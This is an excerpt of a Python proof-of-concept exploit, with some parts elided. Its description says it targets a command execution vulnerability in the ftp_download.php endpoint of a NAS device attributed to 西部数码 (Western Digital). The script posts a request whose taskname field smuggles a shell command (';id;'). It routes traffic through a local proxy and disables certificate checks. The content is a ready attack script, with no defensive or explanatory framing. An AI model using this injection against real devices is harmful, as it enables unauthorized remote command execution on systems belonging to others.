...
def poc(target):
    payload="/web/addons/ftp_download.php"
    user_agents = [
    ...
    data = "action=create&taskname=\";id;\"&host=127.0.0.1&user=test&pwd=test&dest_dir=/tmp&schedule=0&lang=en"
    proxies = {
    "http":"http://127.0.0.1:7890",
    "https":"http://127.0.0.1:7890"
}
    try:
        res1=requests.get(url=target,timeout=5,verify=False,headers=headers1,proxies=proxies)
...
def banner():
    pass
def main():
    parse=argparse.ArgumentParser(description="西部数码NAS ftp_download.php接口存在命令执行漏洞")
